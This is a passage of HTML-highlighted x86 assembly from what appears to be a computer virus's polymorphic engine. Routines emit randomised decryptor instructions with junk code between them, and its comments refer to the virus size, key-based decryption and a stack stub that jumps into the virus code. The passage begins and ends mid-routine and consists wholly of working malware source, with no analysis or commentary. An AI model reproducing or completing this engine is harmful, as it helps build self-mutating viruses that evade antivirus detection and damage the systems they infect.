    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">68h</span><span class="sc0">  </span><span class="sc1">;push sizeofvirusindwords</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">59h</span><span class="sc0">  </span><span class="sc1">;pop ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins4</span><span class="sc0"> 
</span><span class="sc5">ins4_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">99h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins4_3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0c933h</span><span class="sc0">   </span><span class="sc1">;xor ecx,ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ins4orecxval</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins4</span><span class="sc0"> 
</span><span class="sc5">ins4_3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins4_4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0c92bh</span><span class="sc0">   </span><span class="sc1">;sub ecx,ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ins4orecxval</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins4</span><span class="sc0">
</span><span class="sc5">ins4_4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0b9h</span><span class="sc0"> </span><span class="sc1">;mov ecx,not sizeofvirusindwords</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0d1f7h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
</span><span class="sc5">retins4</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">_ins4orecxval</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0c981h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">6h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">WriteInstruction5</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function read 4 bytes from [esi] into eax</span><span class="sc0">
    </span><span class="sc1">;and add to esi register 4 (if there is need to do so).</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12ch</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins5_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0adh</span><span class="sc0"> </span><span class="sc1">;lodsd</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins5</span><span class="sc0">
</span><span class="sc5">ins5_1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins5_2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">068bh</span><span class="sc0">    </span><span class="sc1">;mov eax,dword ptr [esi]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ins5addesi4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins5</span><span class="sc0">
</span><span class="sc5">ins5_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">36ffh</span><span class="sc0">    </span><span class="sc1">;push dword ptr [esi]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">58h</span><span class="sc0">  </span><span class="sc1">;pop eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ins5addesi4</span><span class="sc0">
</span><span class="sc5">retins5</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">_ins5addesi4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function write add to esi register 4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">addesi4_2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0c683h</span><span class="sc0">   </span><span class="sc1">;way 1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4h</span><span class="sc0">   </span><span class="sc1">;add esi,4h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">raddesi</span><span class="sc0">
</span><span class="sc5">addesi4_2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">      </span><span class="sc1">;way 2</span><span class="sc0">
</span><span class="sc5">@incesi</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">46h</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@incesi</span><span class="sc0">
</span><span class="sc5">raddesi</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">WriteInstruction6</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function decrypt the value of eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EncryptionMethod</span><span class="sc4">],</span><span class="sc2">1h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ins6_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0d0f7h</span><span class="sc0">   </span><span class="sc1">;not eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins6</span><span class="sc0">
</span><span class="sc5">ins6_1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EncryptionMethod</span><span class="sc4">],</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ins6_2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">2dh</span><span class="sc0">  </span><span class="sc1">;sub eax,key</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins6</span><span class="sc0">
</span><span class="sc5">ins6_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EncryptionMethod</span><span class="sc4">],</span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ins6_3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">  </span><span class="sc1">;add eax,key</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins6</span><span class="sc0">
</span><span class="sc5">ins6_3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">35h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;xor eax,key</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins6</span><span class="sc0">
</span><span class="sc5">retins6</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">




</span><span class="sc5">WriteInstruction7</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function copy the value of eax to [edi]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">258h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins7_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0abh</span><span class="sc0"> </span><span class="sc1">;stosd</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins7</span><span class="sc0">
</span><span class="sc5">ins7_1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">190h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins7_2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0789h</span><span class="sc0">    </span><span class="sc1">;mov dword ptr [edi],eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addedi4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins7</span><span class="sc0">
</span><span class="sc5">ins7_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">50h</span><span class="sc0">  </span><span class="sc1">;push eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">078fh</span><span class="sc0">    </span><span class="sc1">;pop dword ptr [edi]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">addedi4</span><span class="sc0">
</span><span class="sc5">retins7</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">addedi4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12ch</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">96h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_addedi4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0c783h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins7a</span><span class="sc0">
</span><span class="sc5">_addedi4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
</span><span class="sc5">@incedi</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">47h</span><span class="sc0">  </span><span class="sc1">;inc edi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@incedi</span><span class="sc0">
</span><span class="sc5">retins7a</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">WriteInstruction8</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function write the loop instruction of the decryptor</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12ch</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">96h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ins8_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">49h</span><span class="sc0">  </span><span class="sc1">;dec ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteJunkCode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0f983h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">   </span><span class="sc1">;cmp ecx,0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PolyBuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">75h</span><span class="sc0">  </span><span class="sc1">;jne</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retins8</span><span class="sc0">
</span><span class="sc5">ins8_1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PolyBuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0e2h</span><span class="sc0"> </span><span class="sc1">;loop</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
</span><span class="sc5">retins8</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">WriteInstruction9</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this istruction write a code in the stack,that jump into virus code</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">StartOfDataToEncrypt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ProgramImageBase</span><span class="sc4">]</span><span class="sc0">
